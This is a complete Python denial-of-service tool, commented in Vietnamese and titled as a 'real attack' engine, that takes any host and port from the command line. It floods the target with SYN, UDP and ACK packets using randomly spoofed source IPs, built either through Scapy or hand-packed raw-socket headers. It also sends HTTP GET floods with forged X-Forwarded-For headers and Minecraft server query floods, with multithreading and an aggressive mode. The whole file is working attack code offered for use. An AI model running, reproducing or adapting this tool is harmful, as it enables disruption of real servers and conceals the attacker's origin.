#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DDoS Attack Engine - Phiên bản Tấn công Thực tế
Tác giả: Python Expert
"""

import argparse
import concurrent.futures
import logging
import os
import random
import signal
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from functools import partial

# Thiết lập đặc biệt cho môi trường Replit
REPLIT_ENV = os.environ.get('REPL_ID') is not None

# Kiểm tra gói tin tùy chọn
try:
    from scapy.all import IP, TCP, UDP, Raw, send
    SCAPY_AVAILABLE = True
    logging.info("Scapy đã được tải thành công.")
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy không khả dụng, sẽ sử dụng socket thông thường.")

# Kiểm tra mcstatus
try:
    from mcstatus import JavaServer
    MCSTATUS_AVAILABLE = True
    logging.info("mcstatus đã được tải thành công.")
except ImportError:
    MCSTATUS_AVAILABLE = False
    logging.warning("mcstatus không khả dụng, tính năng query flood bị giới hạn.")

# Kiểm tra psutil
try:
    import psutil
    PSUTIL_AVAILABLE = True
    logging.info("psutil đã được tải thành công.")
except ImportError:
    PSUTIL_AVAILABLE = False
    logging.warning("psutil không khả dụng, giám sát tài nguyên bị giới hạn.")

# Thiết lập logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)

class PacketGenerator:
    """Lớp tạo gói tin cho các loại tấn công"""
    def __init__(self, target_ip, target_port, fake_ips=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.fake_ips = fake_ips or self.generate_fake_ips(1000)  # Tạo 1000 IP giả mặc định
        
    def generate_fake_ips(self, count):
        """Tạo danh sách IP giả"""
        fake_ips = []
        for _ in range(count):
            fake_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            fake_ips.append(fake_ip)
        return fake_ips
    
    def get_random_fake_ip(self):
        """Lấy một IP giả ngẫu nhiên"""
        return random.choice(self.fake_ips)
    
    def get_random_port(self):
        """Lấy một cổng ngẫu nhiên"""
        return random.randint(1024, 65535)
        
    def scapy_syn(self):
        """Tạo gói SYN sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
            
        try:
            ip = IP(
                src=self.get_random_fake_ip(), 
                dst=self.target_ip
            )
            tcp = TCP(
                sport=self.get_random_port(),
                dport=self.target_port,
                flags="S",
                seq=random.randint(1000, 9000),
                window=random.randint(1000, 9000)
            )
            raw = Raw(b"X" * random.randint(0, 1024))
            return ip/tcp/raw
        except Exception as e:
            logging.error(f"Lỗi khi tạo gói SYN Scapy: {e}")
            return None
    
    def scapy_udp(self):
        """Tạo gói UDP sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
            
        try:
            ip = IP(
                src=self.get_random_fake_ip(), 
                dst=self.target_ip
            )
            udp = UDP(
                sport=self.get_random_port(),
                dport=self.target_port
            )
            payload = Raw(b"X" * random.randint(10, 1400))
            return ip/udp/payload
        except Exception as e:
            logging.error(f"Lỗi khi tạo gói UDP Scapy: {e}")
            return None
    
    def scapy_ack(self):
        """Tạo gói ACK sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
            
        try:
            ip = IP(
                src=self.get_random_fake_ip(), 
                dst=self.target_ip
            )
            tcp = TCP(
                sport=self.get_random_port(),
                dport=self.target_port,
                flags="A",
                seq=random.randint(1000, 9000),
                ack=random.randint(1000, 9000),
                window=random.randint(1000, 9000)
            )
            return ip/tcp
        except Exception as e:
            logging.error(f"Lỗi khi tạo gói ACK Scapy: {e}")
            return None
    
    def socket_syn(self):
        """Gửi gói SYN sử dụng socket thông thường"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)  # Timeout rất nhỏ để không chờ đợi
            s.connect_ex((self.target_ip, self.target_port))
            s.close()
            return True
        except:
            return False
    
    def socket_udp(self):
        """Gửi gói UDP sử dụng socket thông thường"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(random.randint(16, 1024))
            s.sendto(data, (self.target_ip, self.target_port))
            s.close()
            return True
        except:
            return False
    
    def socket_ack(self):
        """Mô phỏng gói ACK sử dụng socket thông thường"""
        # Sử dụng raw socket nếu có quyền
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Tạo gói tin header thủ công
            packet = self._create_ack_packet()
            s.sendto(packet, (self.target_ip, 0))
            s.close()
            return True
        except:
            # Nếu không thành công, thử cách kết nối thông thường
            return self.socket_syn()
            
    def _create_ack_packet(self):
        """Tạo gói ACK thủ công cho raw socket"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # tự động điền
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  # tự động điền
        ip_saddr = socket.inet_aton(self.get_random_fake_ip())
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # TCP header fields
        tcp_source = random.randint(1024, 65535)
        tcp_dest = self.target_port
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = random.randint(1, 4294967295)
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 0
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 1
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0  # tự động điền
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source,
            tcp_dest,
            tcp_seq,
            tcp_ack_seq,
            tcp_offset_res,
            tcp_flags,
            tcp_window,
            tcp_check,
            tcp_urg_ptr
        )
        
        return ip_header + tcp_header
    
    def http_flood(self):
        """Tấn công HTTP flood (Layer 7)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((self.target_ip, self.target_port))
            
            # Headers HTTP ngẫu nhiên
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
            ]
            
            paths = [
                "/", 
                "/index.php", 
                "/home", 
                "/api/v1/users", 
                "/admin", 
                "/login", 
                "/products",
                "/search?q=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 10)))
            ]
            
            # Tạo request HTTP ngẫu nhiên
            request = f"GET {random.choice(paths)} HTTP/1.1\r\n"
            request += f"Host: {self.target_ip}\r\n"
            request += f"User-Agent: {random.choice(user_agents)}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            request += f"X-Forwarded-For: {self.get_random_fake_ip()}\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            
            s.send(request.encode())
            s.close()
            return True
        except:
            return False
            
    def query_flood(self):
        """Tấn công query flood cho Minecraft servers"""
        if not MCSTATUS_AVAILABLE:
            return False
            
        try:
            server = JavaServer(self.target_ip, self.target_port)
            server.status()
            return True
        except:
            return False

class AttackManager:
    """Quản lý các cuộc tấn công DDoS"""
    def __init__(self, target_ip, target_port, processes, duration, attack_ratio, 
                 batch_size, delay, retry_count, max_cpu, max_workers=20, 
                 is_root=False, aggressive=False, socket_only=True):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.processes = int(processes)
        self.duration = int(duration)
        self.batch_size = int(batch_size)
        self.delay = float(delay)
        self.retry_count = int(retry_count)
        self.max_cpu = int(max_cpu)
        self.max_workers = int(max_workers)
        self.is_root = is_root
        self.aggressive = aggressive
        self.socket_only = socket_only
        
        self.start_time = None
        self.stop_event = threading.Event()
        self.stats_lock = threading.Lock()
        
        # Thống kê
        self.packets_sent = 0
        self.syn_count = 0
        self.udp_count = 0
        self.ack_count = 0
        self.http_count = 0
        self.query_count = 0
        self.last_packets = 0
        self.current_rate = 0
        self.peak_rate = 0
        self.sum_rates = 0
        self.rate_count = 0
        
        # Tạo packet generator
        self.packet_generator = PacketGenerator(target_ip, self.target_port)
        
        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 4 or abs(sum(ratios) - 100) > 0.001:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.http_ratio = [r/100 for r in ratios]
            self.query_ratio = 0.0  # Không sử dụng query flood trong phiên bản thực tế
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:HTTP, tổng=100 (ví dụ: 40:30:20:10)")
        
    def send_packets(self, attack_type):
        """Gửi gói tin dựa vào loại tấn công"""
        success = False
        if attack_type == "syn":
            if self.socket_only:
                success = self.packet_generator.socket_syn()
            else:
                packet = self.packet_generator.scapy_syn()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_syn()
                else:
                    success = self.packet_generator.socket_syn()
                
        elif attack_type == "udp":
            if self.socket_only:
                success = self.packet_generator.socket_udp()
            else:
                packet = self.packet_generator.scapy_udp()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_udp()
                else:
                    success = self.packet_generator.socket_udp()
                
        elif attack_type == "ack":
            if self.socket_only:
                success = self.packet_generator.socket_ack()
            else:
                packet = self.packet_generator.scapy_ack()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_ack()
                else:
                    success = self.packet_generator.socket_ack()
                    
        elif attack_type == "http":
            success = self.packet_generator.http_flood()
            
        elif attack_type == "query":
            success = self.packet_generator.query_flood()
            
        return success
        
    def attack_process(self, thread_id, stop_event):
        """Worker gửi các loại tấn công"""
        # Đảm bảo start_time đã được thiết lập
        if self.start_time is None:
            self.start_time = time.time()
            logging.warning(f"Thread {thread_id}: Không tìm thấy start_time, tự động khởi tạo")
            
        # Giới hạn tốc độ tấn công trong môi trường Replit
        if REPLIT_ENV:
            local_delay = max(self.delay, 0.05)  # Đảm bảo độ trễ tối thiểu trong Replit
        else:
            local_delay = self.delay
            
        while not stop_event.is_set() and (time.time() - self.start_time < self.duration):
            # Kiểm tra giới hạn CPU nếu có psutil
            try:
                if PSUTIL_AVAILABLE and psutil.cpu_percent(interval=0.1) > self.max_cpu:
                    time.sleep(0.5)  # Giảm tải nếu CPU quá cao
                    continue
            except Exception as e:
                logging.warning(f"Thread {thread_id}: Lỗi khi kiểm tra CPU: {str(e)}")
                
            for _ in range(self.batch_size):
                if stop_event.is_set() or (time.time() - self.start_time >= self.duration):
                    break
                    
                # Chọn loại tấn công dựa trên tỷ lệ
                r = random.random()
                if r < self.syn_ratio:
                    attack_type = "syn"
                elif r < self.syn_ratio + self.udp_ratio:
                    attack_type = "udp"
                elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                    attack_type = "ack"
                elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio + self.http_ratio:
                    attack_type = "http"
                else:
                    attack_type = "query"
                
                # Gửi gói tin
                if self.send_packets(attack_type):
                    with self.stats_lock:
                        self.packets_sent += 1
                        
                        # Cập nhật thống kê theo loại
                        if attack_type == "syn":
                            self.syn_count += 1
                        elif attack_type == "udp":
                            self.udp_count += 1
                        elif attack_type == "ack":
                            self.ack_count += 1
                        elif attack_type == "http":
                            self.http_count += 1
                        elif attack_type == "query":
                            self.query_count += 1
            
            # Thêm độ trễ sau mỗi batch
            if not self.aggressive:
                time.sleep(self.delay)
                
    def multi_thread_attack(self, thread_count, stop_event):
        """Tấn công đa luồng sử dụng ThreadPoolExecutor"""
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            
            for i in range(thread_count):
                future = executor.submit(self.attack_process, i, stop_event)
                futures.append(future)
                
            # Đợi tất cả các luồng hoàn thành khi hết thời gian hoặc có tín hiệu dừng
            while not stop_event.is_set() and (time.time() - self.start_time < self.duration):
                # Kiểm tra nếu tất cả các futures đã hoàn thành
                if all(f.done() for f in futures):
                    break
                time.sleep(0.1)
                
            # Dừng tất cả các threads nếu cần
            if stop_event.is_set() or (time.time() - self.start_time >= self.duration):
                for future in futures:
                    if not future.done():
                        future.cancel()
            
    def stats_collector(self, stop_event):
        """Thu thập và hiển thị thống kê theo thời gian thực"""
        if self.start_time is None:
            self.start_time = time.time()
            logging.warning("Stats collector: Không tìm thấy start_time, tự động khởi tạo")
            
        try:
            while not stop_event.is_set() and (time.time() - self.start_time < self.duration):
                try:
                    # Tính toán tốc độ gói tin
                    with self.stats_lock:
                        current_time = time.time()
                        elapsed = current_time - self.start_time
                        
                        # Đảm bảo không chia cho 0 nếu start_time không chính xác
                        if elapsed <= 0:
                            elapsed = 0.1
                            
                        rate = self.packets_sent - self.last_packets
                        self.current_rate = rate
                        
                        if rate > self.peak_rate:
                            self.peak_rate = rate
                            
                        self.sum_rates += rate
                        self.rate_count += 1
                        self.last_packets = self.packets_sent
                        
                        # Tính CPU/RAM nếu có psutil
                        try:
                            cpu_percent = psutil.cpu_percent() if PSUTIL_AVAILABLE else 0
                        except Exception:
                            cpu_percent = 0
                            logging.warning("Không thể lấy thông tin CPU, sử dụng giá trị mặc định")
                        
                        # Giới hạn gói tin trong môi trường Replit
                        if REPLIT_ENV and rate > 2000:
                            logging.warning(f"Tốc độ gói quá cao ({rate}/giây) trong môi trường Replit, có thể bị giới hạn")
                        
                        # In thống kê
                        logging.info(f"Gói (SYN/UDP/ACK/HTTP): {self.packets_sent} | Tốc độ: {rate} gói/giây | CPU: {cpu_percent:.1f}% | Thời gian: {elapsed:.1f}s")
                
                except Exception as e:
                    logging.error(f"Lỗi khi thu thập thống kê: {str(e)}")
                
                # Đợi 1 giây
                time.sleep(1)
        except Exception as e:
            logging.error(f"Lỗi nghiêm trọng trong stats_collector: {str(e)}")
            
    def run(self):
        """Chạy tấn công DDoS"""
        self.start_time = time.time()
        
        # In thông tin khởi động
        logging.info(f"Bắt đầu tấn công đến {self.target_ip}:{self.target_port}")
        logging.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s")
        logging.info(f"Tỷ lệ tấn công: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% HTTP={self.http_ratio*100:.0f}%")
        logging.info(f"Thời điểm: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        logging.info(f"Sử dụng Scapy: {'Không' if self.socket_only else 'Có' if SCAPY_AVAILABLE else 'Không (không có gói)'}")
        
        # Tạo và bắt đầu threads
        stats_thread = threading.Thread(target=self.stats_collector, args=(self.stop_event,))
        stats_thread.daemon = True
        stats_thread.start()
        
        # Bắt đầu tấn công đa luồng
        logging.info(f"Khởi động tấn công đa luồng với {self.processes} luồng")
        self.multi_thread_attack(self.processes, self.stop_event)
        
        # Dừng thread thống kê
        self.stop_event.set()
        stats_thread.join(timeout=2)
        
        # Tính toán kết quả cuối cùng
        elapsed = time.time() - self.start_time
        average_rate = self.sum_rates / self.rate_count if self.rate_count > 0 else 0
        
        # In kết quả cuối cùng
        logging.info(f"Kết thúc! Tổng gói: {self.packets_sent} | Tốc độ trung bình: {average_rate:.1f} gói/giây")
        logging.info(f"Thời điểm kết thúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Trả về kết quả thống kê
        return {
            "packets_sent": self.packets_sent,
            "duration": self.duration,
            "elapsed": elapsed,
            "current_rate": self.current_rate,
            "peak_rate": self.peak_rate,
            "average_rate": average_rate,
            "syn_count": self.syn_count,
            "udp_count": self.udp_count,
            "ack_count": self.ack_count,
            "http_count": self.http_count,
            "query_count": self.query_count
        }

def check_requirements():
    """Kiểm tra yêu cầu hệ thống"""
    # Kiểm tra quyền root an toàn hơn
    try:
        is_root = os.geteuid() == 0 if hasattr(os, "geteuid") else False
    except Exception:
        is_root = False
        logging.warning("Không thể kiểm tra quyền root, giả định là không có quyền root")
    
    # Kiểm tra môi trường Replit
    if REPLIT_ENV:
        logging.info("Đang chạy trong môi trường Replit - một số giới hạn sẽ được áp dụng")
    
    if not PSUTIL_AVAILABLE:
        logging.warning("psutil không khả dụng, không thể giám sát tài nguyên hệ thống")
    
    if not SCAPY_AVAILABLE:
        logging.warning("Scapy không khả dụng, sẽ sử dụng socket thông thường")
        
    if not MCSTATUS_AVAILABLE:
        logging.warning("mcstatus không khả dụng, tính năng query flood bị vô hiệu hóa")
    
    if not is_root and not SCAPY_AVAILABLE:
        logging.warning("Không có quyền root, một số tính năng sẽ bị giới hạn")
    
    return {
        "is_root": is_root,
        "scapy_available": SCAPY_AVAILABLE,
        "psutil_available": PSUTIL_AVAILABLE,
        "mcstatus_available": MCSTATUS_AVAILABLE,
        "replit_env": REPLIT_ENV
    }

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    logging.info("Nhận được tín hiệu dừng, đang kết thúc...")
    global STOP_EVENT
    if STOP_EVENT:
        STOP_EVENT.set()
    sys.exit(0)

# Khởi tạo STOP_EVENT global
STOP_EVENT = threading.Event()

def main():
    """Hàm chính"""
    parser = argparse.ArgumentParser(description="DDoS Attack Engine - Tấn công Thực tế")
    parser.add_argument("--host", required=True, help="Địa chỉ IP/Domain mục tiêu")
    parser.add_argument("--port", type=int, required=True, help="Cổng mục tiêu")
    parser.add_argument("--processes", type=int, default=4, help="Số luồng tấn công (mặc định: 4)")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian tấn công (giây) (mặc định: 30)")
    parser.add_argument("--batch-size", type=int, default=100, help="Số gói mỗi đợt gửi (mặc định: 100)")
    parser.add_argument("--delay", type=float, default=0.01, help="Độ trễ giữa các đợt gửi (giây) (mặc định: 0.01)")
    parser.add_argument("--attack-ratio", default="40:30:20:10", help="Tỷ lệ tấn công SYN:UDP:ACK:HTTP (mặc định: 40:30:20:10)")
    parser.add_argument("--retry-count", type=int, default=3, help="Số lần thử lại khi gửi không thành công (mặc định: 3)")
    parser.add_argument("--max-cpu", type=int, default=95, help="Giới hạn CPU để tạm dừng tấn công (%) (mặc định: 95)")
    parser.add_argument("--socket-only", action="store_true", help="Chỉ sử dụng socket thông thường (không dùng Scapy)")
    parser.add_argument("--aggressive", action="store_true", help="Chế độ tấn công tích cực (giảm độ trễ)")
    parser.add_argument("--max-workers", type=int, default=20, help="Số luồng tối đa cho mỗi tiến trình (mặc định: 20)")
    
    args = parser.parse_args()
    
    # Thiết lập xử lý tín hiệu
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Kiểm tra các yêu cầu hệ thống
    req_status = check_requirements()
    
    try:
        # Khởi tạo và chạy tấn công
        attack = AttackManager(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay,
            retry_count=args.retry_count,
            max_cpu=args.max_cpu,
            max_workers=args.max_workers,
            is_root=req_status["is_root"],
            aggressive=args.aggressive,
            socket_only=args.socket_only or not req_status["scapy_available"]
        )
        
        attack.run()
        
    except KeyboardInterrupt:
        logging.info("Tấn công đã bị dừng thủ công")
        
    except Exception as e:
        logging.error(f"Lỗi không xử lý được: {e}")
        raise

if __name__ == "__main__":
    main()